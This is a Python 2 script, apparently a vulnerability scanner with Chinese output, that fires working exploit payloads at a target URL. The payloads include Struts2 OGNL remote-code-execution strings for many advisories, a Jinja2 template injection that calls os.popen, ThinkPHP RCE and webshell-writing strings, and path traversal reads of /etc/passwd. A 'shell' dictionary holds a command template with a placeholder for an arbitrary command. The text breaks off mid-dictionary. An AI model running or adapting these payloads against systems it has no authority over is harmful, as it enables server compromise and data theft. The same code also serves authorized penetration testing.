#!/usr/bin/env python
# coding=utf-8
# code by GD
# Date 2019/07/27

import re
import sys
import socket
import base64
import httplib
import warnings
import requests
from termcolor import cprint
from urlparse import urlparse,urlunparse
warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('gbk')
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
#超时设置
TMOUT=10

headers = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101", 
    "Content-Type":"application/x-www-form-urlencoded"
}
headers1={
	  "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
		"Content-Type":"text/xml"
}
headers_052 = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/xml"
}
headers_045 = {
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
     "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}
headers_5418 = {
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Accept":"../../../../../../../../etc/passwd{{",
     "Content-Type":"text/xml"
} #Ruby on Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）

class cve_verify:
    def __init__(self, url):
        if url.startswith("http"):
        	self.url = url
        else:
      		self.url="http://"+url
      	self.data=''
      	self.param=''
        self.poc = {"S2-048":'''%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D''',
                    "S2-052":'''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>whoami</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>''',
                    "S2-016":'''?redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23ot%3d%23resp.getWriter+()%2c%23ot.print(%27web%27)%2c%23ot.print(%27path%3a%27)%2c%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2f%27))%2c%23ot.flush()%2c%23ot.close()%7d''',
                    "S2-053":'''%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A''',
                    "S2-015":'''%24%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream())%2c%23q%7d.action''',
                    "S2-057":'''%24%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3d%23request%5b%27struts.valueStack%27%5d.context).(%23cr%3d%23ct%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ou%3d%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7d/actionChain1.action''',                    
                    "S2-013":'''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D''',
                    "Spring WebFlow(Spring WebFlow)":'''_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("vulnerable","True").aaa=test''',
                    "uWSGI PHP(CVE-2018-7490)":'''/..%2f..%2f..%2f..%2f..%2fetc/passwd''',
                    "Flask(Jinja2)":'''%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D''',
                    "thinkphp5.0.23-rce":'''_method=__construct&filter[]=system&method=get&get[REQUEST_METHOD]=id''', #_method=__construct&filter[]=system&method=get&get[]=id _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
                    "thinkphp5":'''?s=/Index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id''', 
                    "thinkphp5-0":'''?s=/Index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1''',
                    "thinkphp5-1":'''?s=index/%5cthink%5ctemplate%5cdriver%5cfile/write?cacheFile=shell.php&content=<?php%20phpinfo();?>''',
                    "Weblogic(CVE-2017-10271)":'''/wls-wsat/CoordinatorPortType''',                     
                    "phpmyadmin 4.8.1(CVE-2018-12613)":'''/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd''',
                    "Atlassian Confluence(CVE-2019-3396)":'''{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}''',
                
                }
        self.owasp={ "xss":"jsonCallback",
        
        
        
        }
        self.shell = {"S2-048":'''%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27FUZZINGCOMMAND%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D''',
               
                }
                
#    def check(self, pocname, vulnstr):
#        if vulnstr.find("Active Internet connections") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Linux]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("Active Connections") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("活动连接") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("LISTEN") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[未知OS]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        else:
#            cprint("目标不存在" + pocname +"漏洞..", "green")
    def path_replacer(self, target_value):
        urls=urlparse(self.url)
        c_url_list = list(urls)
    
        queries = c_url_list[2].split('/')
        id=len(queries)
        paths=''
        for _id in range(id-1): 
        
            paths+="/"+str(target_value)
    
        return urls.scheme+'://'+urls.netloc+paths+'?'+urls.query
    def url_replacer(self,target_value):
        url=urlparse(self.url)
        if url.query=='':
            return self.url
        c_url_list = list(url)
        
        queries = [q.split('=') for q in c_url_list[4].split('&')]
        
        id=len(queries)
        for _id in range(id): 	                      
    	       queries[_id][1] = target_value
        c_url_list[4] = '&'.join(map(lambda l: '='.join(l), queries))
    
        return urlunparse(c_url_list)
    def data_all_replacer(self,target_value):
        data=self.data
        if data=='':
            return ''
        string=''
        queries = data.split('&')
        id=len(queries)
        for i in range(id):
            list=queries[i].split('=')                 
            string+=list[0]+"="+target_value+"&"        
        return string[:-1]
    def data_replacer(self,target_value):
        data=self.data
        param=self.param
        data=self.data
        if data=='':
            return ''
        string=''
        queries = data.split('&')
        id=len(queries)
        keys=[]
        values=[]
        for i in range(id):
            list=queries[i].split('=')
            keys.append(list[0])                 
            if list[0]==param:   
    	          values.append(target_value)
            else:
                values.append(list[1])               	      
        for i in range(id):		     
            string+=keys[i]+"="+values[i]+"&"        
        return string[:-1]
    def jsonp_replacer(self,target_value):
        string=''
        data=urlparse(self.url).query
        if data=='':
            return self.url+"?"+target_value+'=<h1>FuZz</h1>'
        else:
            return self.url+"&"+target_value+'=<h1>FuZz</h1>'
            
#    def jsonp_replacer(self,param,target_value):
#        string=''
#        data=urlparse(self.url).query
#        if data=='':
#            return self.url.scheme+'://'+self.url.netloc+self.url.path+'?'+param+'='+target_value
#        else:
##        queries = data.split('&')
##        id=len(queries)
##        keys=[]
##        values=[]
##        for i in range(id):
##            list=queries[i].split('=')
##            keys.append(list[0])                 
##            if list[0]==param:   
##        	      values.append(target_value)
##            else:
##                values.append(list[1])                   	      
##        for i in range(id):		     
##            string+=keys[i]+"="+values[i]+"&"        
#            return self.url+        
            
    def scan(self):
              
        cprint("-------检测漏洞--------\n目标url:"+self.url, "cyan")
        filecontent.writelines("检测cve漏洞: "+self.url)
        filecontent.write("\n")
        try:
            if self.param=='':                            
                req = requests.post(self.url, headers=headers, data=self.data_all_replacer(self.poc['S2-048']), timeout=TMOUT, verify=False)
            #print self.data_all_replacer(self.poc['S2-048'])
            else:
                #print self.data_replacer(self.poc['S2-048'])
                req = requests.post(self.url, headers=headers, data=self.data_replacer(self.poc['S2-048']), timeout=TMOUT, verify=False)
            #print req.text
            url=urlparse(self.url)
            req2=requests.get(url.scheme+'://'+url.netloc+url.path+'?fakeparam='+self.poc['S2-048'], headers=headers, timeout=TMOUT, verify=False)
            req1 = requests.get(self.url_replacer(self.poc['S2-048']), headers=headers, timeout=TMOUT, verify=False)
            if "groups=" in req.text or "groups=" in req1.text or "groups=" in req2.text:
                cprint("目标存在S2-048漏洞..", "red")
                filecontent.writelines("S2-048 success!!!\n")
            else:
                cprint("目标不存在S2-048漏洞..", "green")
        except Exception as e:
            cprint("检测S2-048超时..", "cyan")
            print "超时原因: ", e
        try:
            
            
            req = requests.post(self.url, headers=headers_052, data=self.poc['S2-052'], timeout=TMOUT, verify=False)
           
            
            if req.status_code == 500 and "java.security.Provider$Service" in req.text:
                cprint("目标存在S2-052漏洞..(参考metasploit中的struts2_rest_xstream模块)", "red")
                filecontent.writelines("S2-052 success!!!\n")
            else:
                cprint("目标不存在S2-052漏洞..", "green")
        except Exception as e:
            cprint("检测S2-052超时..", "cyan")
            print "超时原因: ", e
        
        try:
           url=urlparse(self.url)
           req = requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['S2-016'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if "webpath" in req.text:
                cprint("目标存在S2-016漏洞..", "red")
                filecontent.writelines("S2-016 success!!!\n")
           else:
                cprint("目标不存在S2-016漏洞..", "green")
        except Exception as e:
            cprint("检测S2-016超时..", "cyan")
            print "超时原因: ", e 
        try:
            if self.param=='':                            
                req = requests.post(self.url, headers=headers, data=self.data_all_replacer(self.poc['S2-053']), timeout=TMOUT, verify=False)
            else:
                #print self.data_replacer(self.poc['S2-048'])
                req = requests.post(self.url, headers=headers, data=self.data_replacer(self.poc['S2-053']), timeout=TMOUT, verify=False)
            #print self.url_replacer(self.poc['S2-053'])
            url=urlparse(self.url)
            req1=requests.get(self.url_replacer(self.poc['S2-053']), headers=headers, timeout=TMOUT, verify=False)
            req2=requests.get(url.scheme+'://'+url.netloc+url.path+'?redirectUri='+self.poc['S2-053'], headers=headers, timeout=TMOUT, verify=False)
            #print req.text
            if "groups=" in req.text or "groups=" in req1.text:
                cprint("目标存在S2-053漏洞..", "red")
                filecontent.writelines("S2-053 success!!!\n")
            else:
                cprint("目标不存在S2-053漏洞..", "green")
        except Exception as e:
            cprint("检测S2-053超时..", "cyan")
            print "超时原因: ", e 
      
        try:

           req = requests.get(self.path_replacer(self.poc['S2-015']), headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if "groups" in req.text:
                cprint("目标存在S2-015漏洞..", "red")
                filecontent.writelines("S2-015 success!!!\n")
           else:
                cprint("目标不存在S2-015漏洞..", "green")
        except Exception as e:
            cprint("检测S2-015超时..", "cyan")
            print "超时原因: ", e 
            
        try:
           req = requests.get(self.path_replacer(self.poc['S2-057']), headers=headers, timeout=TMOUT, verify=False)
           req1=requests.get(url.scheme+'://'+url.netloc+url.path+'/'+self.poc['S2-057'], headers=headers, timeout=TMOUT, verify=False)
           #print req1.url           
           if "groups=" in req.url or "groups=" in req1.url:
                cprint("目标存在S2-057漏洞..", "red")
                filecontent.writelines("S2-057 success!!!\n")
           else:
                cprint("目标不存在S2-057漏洞..", "green")
        except Exception as e:
            cprint("检测S2-057超时..", "cyan")
            print "超时原因: ", e 
        try:
           if self.param=='':                            
                req = requests.post(self.url, headers=headers, data=self.data_all_replacer(self.poc['S2-013']), timeout=TMOUT, verify=False)
            #print self.data_all_replacer(self.poc['S2-048'])
           else:
                #print self.data_replacer(self.poc['S2-048'])
                req = requests.post(self.url, headers=headers, data=self.data_replacer(self.poc['S2-013']), timeout=TMOUT, verify=False)
           req = requests.get(self.url_replacer(self.poc['S2-013']), headers=headers, timeout=TMOUT, verify=False)
           req1=requests.get(url.scheme+'://'+url.netloc+url.path+'?fakeparam='+self.poc['S2-013'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text           
           if "groups=" in req.text or "groups=" in req1.text:
                cprint("目标存在S2-013漏洞..", "red")
                filecontent.writelines("S2-013 success!!!\n")
           else:
                cprint("目标不存在S2-013漏洞..", "green")
        except Exception as e:
            cprint("检测S2-013超时..", "cyan")
            print "超时原因: ", e 
            
        try:
            req = requests.get(self.url, headers=headers_045, timeout=TMOUT, verify=False)
            if "groups=" in req.text:
                cprint("目标存在S2-045漏洞..", "red")
                filecontent.writelines("S2-045 success!!!\n")
            else:
                cprint("目标不存在S2-045漏洞..", "green")
        except Exception as e:
            cprint("检测struts2-045超时..", "cyan")
            print "超时原因: ", e
        try:
            headers045 = {
                'Content-Type':'${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("testvuln",1234*1234)}.multipart/form-data',
            }
            req = requests.get(self.url, headers=headers045, timeout=TMOUT, verify=False)
            #print req.headers
            try:
                if r"1522756" in req.headers['testvuln']:
                    cprint("目标存在struts2-045-2漏洞..", "red")
                    filecontent.writelines("struts2-045-2 success!!!\n")
                else:
                    cprint("目标不存在S2-045-2漏洞..", "green")
            except:
                pass
        except Exception as e:
            cprint("检测struts2-045-2超时..", "cyan")
            print "超时原因: ", e
        
        try:
            uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
            files ={"test":(uploadexp, "text/plain")}
            req = requests.post(self.url, files=files, timeout=TMOUT, verify=False)
            if r"groups=" in req.text:
                cprint("目标存在S2-046漏洞..", "red")
                filecontent.writelines("S2-046 success!!!\n")
            else:
                cprint("目标不存在S2-046漏洞..", "green")
        except Exception as e:
            cprint("检测struts2-046超时..", "cyan")
            print "超时原因: ", e
            
        try:
            if self.param=='':                            
                req1 = requests.post(self.url, headers=headers, data=self.data_all_replacer("${1234*1234}"), timeout=TMOUT, verify=False)
            #print self.data_all_replacer(self.poc['S2-048'])
            else:
                #print self.data_replacer(self.poc['S2-048'])
                req1 = requests.post(self.url, headers=headers, data=self.data_replacer("${1234*1234}"), timeout=TMOUT, verify=False)
          
            req = requests.get(self.url_replacer("${1234*1234}"), headers=headers045, timeout=TMOUT, verify=False)
            #print req.headers
            req2=requests.get(url.scheme+'://'+url.netloc+url.path+'?fakeparam='+"${1234*1234}", headers=headers, timeout=TMOUT, verify=False)
            try:
                if r"1522756" in req.text or r"1522756" in req1.text or r"1522756" in req2.text:
                    cprint("目标存在Spring Boot RCE漏洞..", "red")
                    filecontent.writelines("Spring Boot RCE success!!!\n")
                else:
                    cprint("目标不存在Spring Boot RCE漏洞..", "green")
            except:
                pass
        except Exception as e:
            cprint("检测Spring Boot RCE超时..", "cyan")
            print "超时原因: ", e
        try:
            #print self.data+"&"+self.poc['Spring WebFlow(Spring WebFlow)']
            req = requests.post(self.url, headers=headers,data=self.data+"&"+self.poc['Spring WebFlow(Spring WebFlow)'], timeout=TMOUT, verify=False)
            #print req.headers
            try:
                if r"True" in req.headers['vulnerable']:
                    cprint("目标存在Spring WebFlow(Spring WebFlow)漏洞..", "red")
                    filecontent.writelines("Spring WebFlow(Spring WebFlow) success!!!\n")
                else:
                    cprint("目标不存在Spring WebFlow(Spring WebFlow)漏洞..", "green")
            except:
                pass
        except Exception as e:
            cprint("检测Spring WebFlow(Spring WebFlow)超时..", "cyan")
            print "超时原因: ", e
            
            
        try:
            if self.param=='':                            
                req = requests.post(self.url, headers=headers, data=self.data_all_replacer("{{1234*1234}}"), timeout=TMOUT, verify=False)
            else:
                #print self.data_replacer(self.poc['S2-048'])
                req = requests.post(self.url, headers=headers, data=self.data_replacer("{{1234*1234}}"), timeout=TMOUT, verify=False)
            #print self.url_replacer(self.poc['S2-053'])
            url=urlparse(self.url)
            req1=requests.get(self.url_replacer(self.poc['Flask(Jinja2)']), headers=headers, timeout=TMOUT, verify=False)
            req3=requests.get(self.url_replacer("{{1234*1234}}"), headers=headers, timeout=TMOUT, verify=False)
            req2=requests.get(url.scheme+'://'+url.netloc+url.path+'?fakeparam='+"{{1234*1234}}", headers=headers, timeout=TMOUT, verify=False)
            #print req.text
            if r"1522756" in req.text or r"groups=" in req1.text or r"1522756" in req2.text or r"1522756" in req3.text:
                cprint("目标存在Flask(Jinja2)注入漏洞..", "red")
                filecontent.writelines("Flask(Jinja2) success!!!\n")
            else:
                cprint("目标不存在Flask(Jinja2)注入漏洞..", "green")
        except Exception as e:
            cprint("检测Flask(Jinja2)注入超时..", "cyan")
            print "超时原因: ", e 
        try:            
           req = requests.get(self.url+self.poc['uWSGI PHP(CVE-2018-7490)'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if r"/bin/bash" in req.text:
                cprint("目标存在uWSGI PHP(CVE-2018-7490)目录穿越漏洞..", "red")
                filecontent.writelines("uWSGI PHP(CVE-2018-7490) success!!!\n")
           else:
                cprint("目标不存在uWSGI PHP(CVE-2018-7490)漏洞..", "green")
        except Exception as e:
            cprint("检测uWSGI PHP(CVE-2018-7490)超时..", "cyan")
            print "超时原因: ", e
            
        try:
            
            req = requests.post(url.scheme+'://'+url.netloc+url.path+"?s=captch", headers=headers1, data=self.poc['thinkphp5.0.23-rce'], timeout=TMOUT, verify=False)
            #print req.text
            if "5.0.23" in req.text or "5.0.1" in req.text or "5.0.22" in req.text or "Server at" in req.text:
                cprint("目标可能存在thinkphp5.0.23-rce漏洞..", "red")
                filecontent.writelines("thinkphp5.0.23-rce success!!!\n")
            else:
                cprint("目标不存在thinkphp5.0.23-rce漏洞..", "green")
        except Exception as e:
            cprint("检测thinkphp5.0.23-rce超时..", "cyan")
            print "超时原因: ", e
        try:
            req3= requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['thinkphp5-1'], headers=headers, timeout=TMOUT, verify=False)
            req2= requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['thinkphp5-0'], headers=headers, timeout=TMOUT, verify=False)
            req = requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['thinkphp5'], headers=headers, timeout=TMOUT, verify=False)
            #print req2.text
            if "groups=" in req.text or "PHP Version" in req2.text or "PHP Version" in req3.text:
                cprint("目标存在thinkphp5漏洞..", "red")
                filecontent.writelines("thinkphp5 success!!!\n")
#            elif "phpinfo" in req2.text:
#                cprint("目标存在thinkphp5.0.7漏洞..", "red")
#                filecontent.writelines("thinkphp5 success!!!\n")
            else:
                cprint("目标不存在thinkphp5漏洞..", "green")
        except Exception as e:
            cprint("检测thinkphp5超时..", "cyan")
            print "超时原因: ", e  
            
        try:
            
           req = requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['Weblogic(CVE-2017-10271)'], headers=headers1, timeout=TMOUT, verify=False)
           req1 = requests.get(url.scheme+'://'+url.netloc+self.poc['Weblogic(CVE-2017-10271)'], headers=headers1, timeout=TMOUT, verify=False)
           #print req.text
           if "Service Name:" in req.text or "Service Name:" in req1.text:
                cprint("目标存在Weblogic(CVE-2017-10271)漏洞..", "red")
                filecontent.writelines("Weblogic(CVE-2017-10271) success!!!\n")
           else:
                cprint("目标不存在Weblogic(CVE-2017-10271)漏洞..", "green")
        except Exception as e:
            cprint("检测Weblogic(CVE-2017-10271)超时..", "cyan")
            print "超时原因: ", e
            
        try:
            
            req = requests.get(self.url, headers=headers_5418, timeout=TMOUT, verify=False)
            #print req.text
            try:
                if r"/bin/bash" in req.text:
                    cprint("目标存在Ruby on Rails(CVE-2019-5418)路径穿越与任意文件读取漏洞..", "red")
                    filecontent.writelines("Ruby on Rails(CVE-2019-5418) success!!!\n")
                else:
                    cprint("目标不存在Ruby on Rails(CVE-2019-5418)漏洞..", "green")
            except:
                pass
        except Exception as e:
            cprint("检测Ruby on Rails(CVE-2019-5418)超时..", "cyan")
            print "超时原因: ", e 
            
        try:
            
           req = requests.get(url.scheme+'://'+url.netloc+url.path+self.poc['phpmyadmin 4.8.1(CVE-2018-12613)'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if "root:" in req.text:
                cprint("目标存在phpmyadmin 4.8.1(CVE-2018-12613)文件包含漏洞..", "blue")
                filecontent.writelines("phpmyadmin 4.8.1(CVE-2018-12613) success!!!\n")
           else:
                cprint("目标不存在phpmyadmin 4.8.1(CVE-2018-12613)漏洞..", "green")
        except Exception as e:
            cprint("检测phpmyadmin 4.8.1(CVE-2018-12613)超时..", "cyan")
            print "超时原因: ", e 
        try:
            headers_3396 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": url.scheme+'://'+url.netloc + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
